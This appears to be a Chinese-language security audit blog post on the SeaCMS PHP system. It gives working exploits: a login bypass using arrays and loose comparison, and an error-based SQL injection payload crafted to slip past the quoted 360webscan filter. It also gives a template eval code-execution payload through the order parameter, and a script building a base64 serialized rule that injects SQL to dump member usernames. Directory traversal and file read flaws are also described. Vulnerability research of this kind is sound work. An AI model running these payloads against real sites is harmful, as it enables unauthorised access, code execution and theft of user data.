## cms组成

首先,存在一个`360safe`文件夹,cms会自动包含`360safe`里面的`360webscan.php`进行防护

而在`include/common.php`中有一个重要的功能是检查和注册外部提交的变量

```php
foreach($_REQUEST as $_k=>$_v)
{
    if( strlen($_k)>0 && m_eregi('^(cfg_|GLOBALS)',$_k) && !isset($_COOKIE[$_k]) )
    {
        exit('Request var not allow!');
    }
}

function _RunMagicQuotes(&$svar)
{
    if(!get_magic_quotes_gpc())
    {
        if( is_array($svar) )
        {
            foreach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v);
        }
        else
        {
            $svar = addslashes($svar);
        }
    }
    return $svar;
}

foreach(Array('_GET','_POST','_COOKIE') as $_request)
{
    foreach($$_request as $_k => $_v) ${$_k} = _RunMagicQuotes($_v);
}
```

首先通过`m_eregi`检查变量名是否以敏感字符开头,如果检查到敏感字符则直接`exit`

而后面的两个`foreach`语句首先对传入的变量进行`addslashes`处理,然后`${$_k} = _RunMagicQuotes($_v)`进行变量注册

## 数组绕过"登录"

```php
$userid = RemoveXSS(stripslashes($userid));
$userid = addslashes(cn_substr($userid, 60));

$pwd = substr(md5($pwd), 5, 20);
$row1 = $dsql->GetOne("select * from sea_member where state=1 and username='$userid'");
if ($row1['username'] == $userid and $row1['password'] == $pwd) {
    $_SESSION['sea_user_id'] = $row1['id'];
    $_SESSION['sea_user_name'] = $row1['username'];
    $_SESSION['sea_user_group'] = $row1['gid'];
    $_SESSION['hashstr'] = $hashstr;
    $dsql->ExecuteNoneQuery("UPDATE `sea_member` set logincount=logincount+1");
    ShowMsg("成功登录，正在转向首页！", "index.php", 0, 3000);
    exit();
} else {
    ShowMsg("密码错误或账户已被禁用", "login.php", 0, 3000);
    exit();
}
```

假设传入`userid[]=123&pwd[]=456`,`$userid`与`$pwd`均为数组

```php
<?php

$userid=array('123');
var_dump(stripslashes($userid));
```

[https://3v4l.org/suHRm](https://3v4l.org/suHRm)

在`8.0`以上的版本会直接报错,而在`8.0`以下的版本会返回一个`Warning`警告,并返回`NULL`

---

```php
<?php

$userid=array('123');
var_dump(addslashes(stripslashes($userid)));
```

[https://3v4l.org/KtiRJ](https://3v4l.org/KtiRJ)

而在外面包裹一个`addslashes`则会返回`string(0) ""`

---

```php
<?php

$pwd=array('456');
var_dump(md5($pwd));
var_dump(substr(md5($pwd), 5, 20));
```

[https://3v4l.org/ET69D](https://3v4l.org/ET69D)

`md5`处理数组会返回`NULL`,而`substr`去处理`NULL`会返回`bool(false)`

---

`$row1 = $dsql->GetOne("select * from sea_member where state=1 and username='$userid'");`此时传入的`$userid`为`string(0) ""`,而`$row1`得到的结果将会是`$row1['username']=NULL`和`$row1['password']=NULL`

```php
<?php
error_reporting(0);
$db = new mysqli("172.17.0.1", "root", "root", "test", "4000");
$userid=array('123');
$pwd=array('456');


$userid = stripslashes($userid);
var_dump($userid);
$userid = addslashes($userid);
var_dump($userid);

$pwd = substr(md5($pwd), 5, 20);
$result = $db->query("select * from test where username='$userid'");
var_dump($result);
$row=$result->fetch_row();
var_dump($row['username']);
var_dump($row['password']);
```

```php
null
string '' (length=0)
object(mysqli_result)[2]
  public 'current_field' => int 0
  public 'field_count' => int 2
  public 'lengths' => null
  public 'num_rows' => int 0
  public 'type' => int 0
null
null
```

---

注意到`$row1['username'] == $userid and $row1['password'] == $pwd`这里是弱类型比较

`$row1['username']`为`NULL`,`$userid`为`string(0) ""`,弱类型比较为真

`$row1['password']`为`NULL`,`$pwd`为`bool(false)`,弱类型比较为真,因此成功"登录"

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203071925858.png)

但是由于`member.php`会对`$_SESSION['sea_user_id']`,这种方式是没有更新`$_SESSION['sea_user_id']`所以实际上是没有登录的,但确实绕过了登录验证代码

```php
$action = isset($action) ? trim($action) : 'cc';
$page = isset($page) ? intval($page) : 1;
$uid=$_SESSION['sea_user_id'];
$uid = intval($uid);
$hashstr=md5($cfg_dbpwd.$cfg_dbname.$cfg_dbuser);//构造session安全码
if(empty($uid) OR $_SESSION['hashstr'] !== $hashstr)
{
	showMsg("请先登录","login.php");
	exit();
}
```

后台的登录处理如下,无法利用数组进行绕过

```php
function checkUser($username,$userpwd)
{
    global $dsql;

    //只允许用户名和密码用0-9,a-z,A-Z,'@','_','.','-'这些字符
    $this->userName = m_ereg_replace("[^0-9a-zA-Z_@!\.-]",'',$username);
    $this->userPwd = m_ereg_replace("[^0-9a-zA-Z_@!\.-]",'',$userpwd);
    $pwd = substr(md5($this->userPwd),5,20);
    $dsql->SetQuery("Select * From `sea_admin` where name like '".$this->userName."' and state='1' limit 0,1");
    $dsql->Execute();
    $row = $dsql->GetObject();
    if(!isset($row->password))
    {
        return -1;
    }
    else if($pwd!=$row->password)
    {
        return -2;
    }
    else
    {
        $loginip = GetIP();
        $this->userID = $row->id;
        $this->groupid = $row->groupid;
        $this->userName = $row->name;
        $inquery = "update `sea_admin` set loginip='$loginip',logintime='".time()."' where id='".$row->id."'";
        $dsql->ExecuteNoneQuery($inquery);
        return 1;
    }
}
```

## comment/api/index.php存在报错注入

```php
if($page<2)
{
	if(file_exists($jsoncachefile))
	{
		$json=LoadFile($jsoncachefile);
		die($json);
	}
}
$h = ReadData($id,$page);
$rlist = array();
if($page<2)
{
	createTextFile($h,$jsoncachefile);
}
die($h);	


function ReadData($id,$page)
{
	global $type,$pCount,$rlist;
	$ret = array("","",$page,0,10,$type,$id);
	if($id>0)
	{
		$ret[0] = Readmlist($id,$page,$ret[4]);
		$ret[3] = $pCount;
		$x = implode(',',$rlist);
		if(!empty($x))
		{
		$ret[1] = Readrlist($x,1,10000);
		}
	}	
	$readData = FormatJson($ret);
	return $readData;
}

...

function Readrlist($ids,$page,$size)
{
	global $dsql,$type;
	$rl=array();
	$sql = "SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC";
	$dsql->setQuery($sql);
	$dsql->Execute('commentrlist');
	while($row=$dsql->GetArray('commentrlist'))
	{
		$rl[]="\"".$row['id']."\":{\"uid\":".$row['uid'].",\"tmp\":\"\",\"nick\":\"".$row['username']."\",\"face\":\"\",\"star\":\"\",\"anony\":".(empty($row['username'])?1:0).",\"from\":\"".$row['username']."\",\"time\":\"".$row['dtime']."\",\"reply\":\"".$row['reply']."\",\"content\":\"".$row['msg']."\",\"agree\":".$row['agree'].",\"aginst\":".$row['anti'].",\"pic\":\"".$row['pic']."\",\"vote\":\"".$row['vote']."\",\"allow\":\"".(empty($row['anti'])?0:1)."\",\"check\":\"".$row['ischeck']."\"}";
	}
	$readrlist=join($rl,",");
	return $readrlist;
}
```

注意到`Readrlist`中的sql语句为`$sql = "SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=$type AND id in ($ids) ORDER BY id DESC";`,`$ids`使用`()`进行闭合,可能会存在注入漏洞

在`ReadData`函数中`$x = implode(',',$rlist);`并调用`Readrlist($x,1,10000)`,向`$rlist`传入一个含有恶意字符串的数组,通过`implode`进行拼接转换为字符串,即可在`Readrlist`中进行注入

`使用$rlist`需要满足前置条件即`page>=2`和`id>0`

```php
if($page<2)
{
	if(file_exists($jsoncachefile))
	{
		$json=LoadFile($jsoncachefile);
		die($json);
	}
}
$h = ReadData($id,$page);
```

`$rlist $id $page`来源于用户传入的参数,而这些参数在`include/common.php`完成注册,因此这里直接传参即可进行sql注入,但要注意360webscan存在过滤

```
\\<.+javascript:window\\[.{1}\\\\x|<.*=(&#\\d+?;?)+?>|<.*(data|src)=data:text\\/html.*>|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|<[a-z]+?\\b[^>]*?\\bon([a-z]{4,})\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|>|<|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|<\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|'|\").*?(`|'|\")\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|'|\").*?(`|'|\"))FROM(\\(.+\\)|\\s+?.+?|(`|'|\").*?(`|'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)
```

过滤`UPDATE`用`extractvalue`替换,过滤`(group_)?concat`用`concat_ws`

`gid=1&page=3&rlist[]=extractvalue(1,concat_ws(0x7e,1,user(),database(),version()))`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081107983.png)

## include/main.class.php存在eval代码执行

```php
function buildregx($regstr,$regopt)
{
	return '/'.str_replace('/','\/',$regstr).'/'.$regopt;
}

function parseStrIf($strIf)
{
    if (strpos($strIf, '=') === false) {
        return $strIf;
    }
    if ((strpos($strIf, '==') === false) && (strpos($strIf, '=') > 0)) {
        $strIf = str_replace('=', '==', $strIf);
    }
    $strIfArr =  explode('==', $strIf);
    return (empty($strIfArr[0]) ? 'NULL' : $strIfArr[0]) . "==" . (empty($strIfArr[1]) ? 'NULL' : $strIfArr[1]);
}

function parseIf($content)
{
    if (strpos($content, '{if:') === false) {
        return $content;
    } else {
        $labelRule = buildregx("{if:(.*?)}(.*?){end if}", "is");
        $labelRule2 = "{elseif";
        $labelRule3 = "{else}";
        preg_match_all($labelRule, $content, $iar);
        $arlen = count($iar[0]);
        $elseIfFlag = false;
        for ($m = 0; $m < $arlen; $m++) {
            $strIf = $iar[1][$m];
            $strIf = $this->parseStrIf($strIf);
            $strThen = $iar[2][$m];
            $strThen = $this->parseSubIf($strThen);
            if (strpos($strThen, $labelRule2) === false) {
                if (strpos($strThen, $labelRule3) >= 0) {
                    $elsearray = explode($labelRule3, $strThen);
                    $strThen1 = $elsearray[0];
                    $strElse1 = $elsearray[1];
                    @eval("if(" . $strIf . "){\$ifFlag=true;}else{\$ifFlag=false;}");
                    if ($ifFlag) {
                        $content = str_replace($iar[0][$m], $strThen1, $content);
                    } else {
                        $content = str_replace($iar[0][$m], $strElse1, $content);
                    }
                } else {
                    @eval("if(" . $strIf . ") { \$ifFlag=true;} else{ \$ifFlag=false;}");
                    if ($ifFlag) $content = str_replace($iar[0][$m], $strThen, $content);
                    else $content = str_replace($iar[0][$m], "", $content);
                }
            } else {
                $elseIfArray = explode($labelRule2, $strThen);
                $elseIfArrayLen = count($elseIfArray);
                $elseIfSubArray = explode($labelRule3, $elseIfArray[$elseIfArrayLen - 1]);
                $resultStr = $elseIfSubArray[1];
                $elseIfArraystr0 = addslashes($elseIfArray[0]);
                @eval("if($strIf){\$resultStr=\"$elseIfArraystr0\";}");
                for ($elseIfLen = 1; $elseIfLen < $elseIfArrayLen; $elseIfLen++) {
                    $strElseIf = getSubStrByFromAndEnd($elseIfArray[$elseIfLen], ":", "}", "");
                    $strElseIf = $this->parseStrIf($strElseIf);
                    $strElseIfThen = addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen], "}", "", "start"));
                    @eval("if(" . $strElseIf . "){\$resultStr=\"$strElseIfThen\";}");
                    @eval("if(" . $strElseIf . "){\$elseIfFlag=true;}else{\$elseIfFlag=false;}");
                    if ($elseIfFlag) {
                        break;
                    }
                }
                $strElseIf0 = getSubStrByFromAndEnd($elseIfSubArray[0], ":", "}", "");
                $strElseIfThen0 = addslashes(getSubStrByFromAndEnd($elseIfSubArray[0], "}", "", "start"));
                if (strpos($strElseIf0, '==') === false && strpos($strElseIf0, '=') > 0) $strElseIf0 = str_replace('=', '==', $strElseIf0);
                @eval("if(" . $strElseIf0 . "){\$resultStr=\"$strElseIfThen0\";\$elseIfFlag=true;}");
                $content = str_replace($iar[0][$m], $resultStr, $content);
            }
        }
        return $content;
    }
}
```

在`parseIf`中利用正则提取内容,然后把内容分拆后放到`eval`中从而达到代码执行的目的

搜索`parseIf`的引用,发现在`search.php`中会向模板中插入用户数据后传递给`parseIf`(其他的php没有这种行为,只会直接将模板读取然后传递给`parseIf`)

一开始我用的是`searchword`参数,但是传递进去后发现内容被修改,然后我换成`order`参数,发现这个参数只进行`addslashes`转义操作

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081416771.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081419458.png)

将`order`参数利用`str_replace`替换到`content`后,`content`被传递到`parseIf`进行分拆并eval执行

最终payload

`searchtype=5&order="}asdf{end if}  {if:phpinfo()}asdf{end if}`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081454475.png)

[一个师傅的分析文章 seacms 多个版本的代码执行漏洞总结](https://github.com/jiangsir404/PHP-code-audit/blob/master/seacms/seacms%20%E5%A4%9A%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93(search.php).md)

## admin/admin_collect_news.php存在注入(无视waf)

反引号注入,正则搜索规则\`[$][A-Za-z0-9_]*\`

```php
elseif($action=="importok")
{
	$importrule = trim($importrule);
	if(empty($importrule))
	{
		ShowMsg("规则内容为空！","-1");
		exit();
	}
	//对Base64格式的规则进行解码
	if(m_ereg('^BASE64:',$importrule))
	{
		if(!m_ereg(':END$',$importrule))
		{
			ShowMsg('该规则不合法，Base64格式的采集规则为：BASE64:base64编码后的配置:END !','-1');
			exit();
		}
		$importrules = explode(':',$importrule);
		$importrule = $importrules[1];
		$importrule = unserialize(base64_decode($importrule)) OR  die('配置字符串有错误！'); 
		//die(base64_decode($importrule));
	}
	else
	{
		ShowMsg('该规则不合法，Base64格式的采集规则为：BASE64:base64编码后的配置:END !','-1');
		exit();
	}
	if(!is_array($importrule) || !is_array($importrule['config']) || !is_array($importrule['type']))
	{
		ShowMsg('该规则不合法，无法导入!','-1');
		exit();
	}
	$data = $importrule['config'];
	unset($data['cid']);
	$data['cname'].="(导入时间:".date("Y-m-d H:i:s").")";
	$data['cotype'] = '1';
	$sql = si("sea_co_config",$data,1);
	$dsql->ExecuteNoneQuery($sql);
	$cid = $dsql->GetLastID();
	if (!empty($importrule['type'])){
		foreach ($importrule['type'] as $type){
			unset($type['tid']);
			$type['cid'] = $cid;
			$type['addtime'] = time();
			$type['cjtime'] = '';
			$type['cotype'] = '1';
			$data = $type;
			$sql = si("sea_co_type",$data,1);
			$dsql->ExecuteNoneQuery($sql);
		}
	}
	ShowMsg('成功导入规则!','admin_collect_news.php');
	exit;
}

...

function si($table, $data, $needQs=false)
{
	if (count($data)>1)
	{
		$t1 = $t2 = array();
		$i=0;
		foreach($data as $key=>$value)
		{
			if($i!=0&&$i%2==0)
			{
				$t1[] = $key;
				
				$t2[] = $needQs?qs($value):"'$value'";
			}
			
			$i+=1;
		}
		$sql =  "INSERT INTO `$table` (`".implode("`,`",$t1)."`) VALUES(".implode(",",$t2).")";
	}
	else
	{
		$arr = array_keys($data);
		$feild = $arr[0];
		$value = $data[$feild];
		$value = $needQs?qs($value):"'$value'";
		$sql = "INSERT INTO `$table` (`$feild`) VALUES ($value)";
	}
	return $sql;
}

function qs($s)
{
	return "'".addslashes($s)."'";
}
```

`$importrule = unserialize(base64_decode($importrule))`对`$importrule`进行base64解码后进行反序列化(全局搜索了一下,除了php原生类之外好像没有别的利用点)

反序列化后要满足这个条件`if(!is_array($importrule) || !is_array($importrule['config']) || !is_array($importrule['type']))`

```php
$data = $importrule['config'];
unset($data['cid']);
$data['cname'].="(导入时间:".date("Y-m-d H:i:s").")";
$data['cotype'] = '1';
$sql = si("sea_co_config",$data,1);
```

对反序列化解析出的`$importrule['config']`进行一定的处理,处理后的`$data`被传入到`si`中,显然`count($data)`大于1,但要注意只有当`$i%2==0`时数据才会被拼接到sql语句中,因此在构造序列化数组时要注意添加垃圾数据进行填充

```php
foreach($data as $key=>$value)
{
	if($i!=0&&$i%2==0)
	{
        $t1[] = $key;
        $t2[] = $needQs?qs($value):"'$value'";
	}
	$i+=1;
}
$sql =  "INSERT INTO `$table` (`".implode("`,`",$t1)."`) VALUES(".implode(",",$t2).")";
```

同时要注意`sea_co_config`的表属性,其中`cname`的长度限制为50

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081048580.png)

```php
<?php
$importrule = array();
$importrule['config'] = array();
$importrule['config']['abc']='asdf';
$importrule['config']['123']='asdf';
$importrule['config']['cname`,`getlistnum`,`getconnum`,`cotype`) values ((select group_concat(username) from seacms.sea_member),10,100,1)#']='asdf';
$importrule['type'] = array();
var_dump(serialize($importrule));
var_dump("BASE64:".base64_encode(serialize($importrule)).":END");
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081053345.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081054054.png)

## admin/admin_template.php存在目录穿越/任意文件删除漏洞

```php
<?php
require_once(dirname(__FILE__)."/config.php");
if(empty($action))
{
	$action = '';
}

$dirTemplate="../templets";

...

else
{
	if(empty($path)) $path=$dirTemplate; else $path=strtolower($path);
	if(substr($path,0,11)!=$dirTemplate){
		ShowMsg("只允许编辑templets目录！","admin_template.php");
		exit;
	}
	$flist=getFolderList($path);
	include(sea_ADMIN.'/templets/admin_template.htm');
	exit();
}
```

只要求满足`substr($path,0,11)==$dirTemplate`即前11个字符为`../templets`因此可以传入`..`进行目录穿越

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081116146.png)

## admin/admin_collect.php存在任意文件读取

全局搜索`@file_get_contents`发现有几个html模板里面有这个函数,因此查找哪个php文件调用了这几个模板

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081151911.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081152717.png)

在目标站点URL处输入即可

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081156234.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203081149826.png)